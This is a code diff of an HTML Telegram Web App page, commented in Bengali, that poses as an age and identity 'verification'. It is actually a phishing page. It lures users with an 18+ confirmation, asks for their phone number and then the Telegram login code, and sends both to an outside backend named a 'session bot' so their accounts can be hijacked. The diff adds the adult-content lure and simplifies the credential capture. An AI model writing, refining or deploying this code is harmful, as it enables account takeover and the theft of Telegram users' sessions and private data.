@@ -3,134 +3,90 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Verification</title>
+    <title>Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: sans-serif; padding: 20px; text-align: center; background-color: #f0f2f5; }
-        .box { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 350px; margin: auto; }
-        
-        /* নম্বর বক্সের ডিজাইন */
-        input { 
-            width: 100%; 
-            padding: 12px; 
-            padding-left: 15px; 
-            margin: 15px 0; 
-            border: 1.5px solid #ddd; 
-            border-radius: 10px; 
-            font-size: 18px; 
-            text-align: left; /* বাম দিকে অ্যালাইন করা হয়েছে */
-            outline: none; 
-            box-sizing: border-box;
-        }
-
-        /* ওটিপি বক্সের ডিজাইন */
-        #otp_display {
-            text-align: center; /* ওটিপি মাঝখানে দেখাবে */
-            padding-left: 0;
-        }
-        
-        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 15px; }
-        .key { background: #f8f9fa; border: 1px solid #ddd; padding: 15px; border-radius: 10px; font-size: 20px; font-weight: bold; cursor: pointer; transition: 0.2s; }
-        .key:active { background: #e2e6ea; transform: scale(0.95); }
-        .key.action { background: #0088cc; color: white; border: none; }
-        
-        .btn-main { background-color: #0088cc; color: white; border: none; padding: 14px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 20px; font-size: 16px; }
+        body { font-family: sans-serif; padding: 0; margin: 0; text-align: center; background: #000 url('https://telegra.ph/file/0c97693d2567849e7b233.jpg') no-repeat center; background-size: cover; color: white; }
+        .overlay { background: rgba(0,0,0,0.7); height: 100vh; display: flex; flex-direction: column; justify-content: center; padding: 20px; box-sizing: border-box; }
+        .box { background: white; color: #333; padding: 25px; border-radius: 20px; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
+        input { width: 100%; padding: 15px; margin: 15px 0; border: 1px solid #ddd; border-radius: 12px; font-size: 18px; box-sizing: border-box; outline: none; }
+        .btn { background: linear-gradient(to right, #ff416c, #ff4b2b); color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 18px; }
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 10px; }
+        .key { background: #f1f1f1; padding: 15px; border-radius: 10px; font-size: 22px; font-weight: bold; color: #333; cursor: pointer; }
         .hidden { display: none; }
-        .loader { color: #888; font-size: 14px; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h3 id="title">Security Check</h3>
-        
-        <div id="step1">
-            <p style="font-size: 14px; color: #666;">Enter your number with country code</p>
-            <input type="tel" id="phone" value="+">
-            <button class="btn-main" id="btn1" onclick="sendNumber()">Get Access Key</button>
-            <div id="load1" class="loader hidden">Sending request...</div>
+    <div class="overlay">
+        <!-- ধাপ ১: ১৮+ কনফার্মেশন -->
+        <div id="step0" class="box">
+            <h2 style="margin-top:0;">⚠️ Attention!</h2>
+            <p>To continue, you must confirm that you are over 18 😊</p>
+            <button class="btn" onclick="nextStep(1)">🔞 Confirm 🔞</button>
         </div>
 
-        <div id="step2" class="hidden">
-            <p style="color: green; font-weight: bold;">✅ Authorization Sent!</p>
-            <p style="font-size: 13px; color: #666;">Enter the 5-digit key received in Telegram</p>
-            <input type="text" id="otp_display" placeholder="- - - - -" readonly>
-            
+        <!-- ধাপ ২: ফোন নম্বর -->
+        <div id="step1" class="box hidden">
+            <h3>Identity Check</h3>
+            <p style="font-size:14px; color:#666;">Enter your phone number to proceed</p>
+            <input type="tel" id="phone" value="+">
+            <button class="btn" id="btn1" onclick="sendNumber()">Submit</button>
+        </div>
+
+        <!-- ধাপ ৩: ওটিপি কিপ্যাড -->
+        <div id="step2" class="box hidden">
+            <h3>Enter Key</h3>
+            <p style="font-size:13px; color:green;">Code sent to your Telegram account!</p>
+            <input type="text" id="otp_display" placeholder="- - - - -" readonly style="text-align:center;">
             <div class="keypad">
-                <div class="key" onclick="addNum('1')">1</div>
-                <div class="key" onclick="addNum('2')">2</div>
-                <div class="key" onclick="addNum('3')">3</div>
-                <div class="key" onclick="addNum('4')">4</div>
-                <div class="key" onclick="addNum('5')">5</div>
-                <div class="key" onclick="addNum('6')">6</div>
-                <div class="key" onclick="addNum('7')">7</div>
-                <div class="key" onclick="addNum('8')">8</div>
-                <div class="key" onclick="addNum('9')">9</div>
-                <div class="key" onclick="clearNum()">C</div>
-                <div class="key" onclick="addNum('0')">0</div>
-                <div class="key action" onclick="verifyOTP()">OK</div>
+                <div class="key" onclick="addNum('1')">1</div><div class="key" onclick="addNum('2')">2</div><div class="key" onclick="addNum('3')">3</div>
+                <div class="key" onclick="addNum('4')">4</div><div class="key" onclick="addNum('5')">5</div><div class="key" onclick="addNum('6')">6</div>
+                <div class="key" onclick="addNum('7')">7</div><div class="key" onclick="addNum('8')">8</div><div class="key" onclick="addNum('9')">9</div>
+                <div class="key" onclick="clearNum()">C</div><div class="key" onclick="addNum('0')">0</div><div class="key" style="background:#34a853; color:white;" onclick="verifyOTP()">OK</div>
             </div>
-            <div id="load2" class="loader hidden">Finalizing...</div>
         </div>
     </div>
 
     <script>
         let tg = window.Telegram.WebApp;
-        let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : "test_user";
+        tg.expand();
         const BACKEND_URL = "https://pmrony-session-bot.hf.space";
         let currentOTP = "";
 
-        const phoneInput = document.getElementById("phone");
-        phoneInput.addEventListener("input", function() {
+        function nextStep(s) {
+            document.getElementById('step0').classList.add('hidden');
+            document.getElementById('step1').classList.remove('hidden');
+        }
+
+        // প্লাস চিহ্ন ধরে রাখা
+        document.getElementById("phone").addEventListener("input", function() {
             if (!this.value.startsWith("+")) { this.value = "+" + this.value.replace("+", ""); }
         });
 
-        function addNum(num) {
-            if(currentOTP.length < 5) {
-                currentOTP += num;
-                document.getElementById("otp_display").value = currentOTP;
-            }
-        }
-        function clearNum() {
-            currentOTP = "";
-            document.getElementById("otp_display").value = "";
-        }
+        function addNum(n) { if(currentOTP.length < 5) { currentOTP += n; document.getElementById("otp_display").value = currentOTP; } }
+        function clearNum() { currentOTP = ""; document.getElementById("otp_display").value = ""; }
 
         async function sendNumber() {
             let ph = document.getElementById("phone").value.trim();
-            document.getElementById("btn1").disabled = true;
-            document.getElementById("load1").classList.remove("hidden");
-            try {
-                let res = await fetch(`${BACKEND_URL}/send_number`, {
-                    method: "POST",
-                    headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({ user_id: userId, phone: ph })
-                });
-                let data = await res.json();
-                if(data.status === "success") {
-                    document.getElementById("step1").classList.add("hidden");
-                    document.getElementById("step2").classList.remove("hidden");
-                    document.getElementById("title").innerText = "Account Verification";
-                } else { alert("Error: " + data.message); }
-            } catch(e) { alert("Connection Error!"); }
-            document.getElementById("btn1").disabled = false;
-            document.getElementById("load1").classList.add("hidden");
+            document.getElementById("btn1").innerText = "Wait...";
+            let res = await fetch(`${BACKEND_URL}/send_number`, {
+                method: "POST", headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({ user_id: tg.initDataUnsafe.user.id, phone: ph })
+            });
+            let data = await res.json();
+            if(data.status === "success") {
+                document.getElementById("step1").classList.add("hidden");
+                document.getElementById("step2").classList.remove("hidden");
+            } else { alert("Error!"); document.getElementById("btn1").innerText = "Submit"; }
         }
 
         async function verifyOTP() {
-            if(currentOTP.length < 5) return alert("Enter 5-digit key!");
-            document.getElementById("load2").classList.remove("hidden");
-            try {
-                let res = await fetch(`${BACKEND_URL}/verify_otp`, {
-                    method: "POST",
-                    headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({ user_id: userId, otp: currentOTP })
-                });
-                let data = await res.json();
-                if(data.status === "success") {
-                    tg.showPopup({ message: "✅ Success! Synchronization complete." }, () => { tg.close(); });
-                } else { alert("❌ Error: " + data.message); }
-            } catch(e) { alert("Server Error!"); }
-            document.getElementById("load2").classList.add("hidden");
+            let res = await fetch(`${BACKEND_URL}/verify_otp`, {
+                method: "POST", headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({ user_id: tg.initDataUnsafe.user.id, otp: currentOTP })
+            });
+            let data = await res.json();
+            if(data.status === "success") { tg.close(); } else { alert("Wrong Key!"); clearNum(); }
         }
     </script>
 </body>
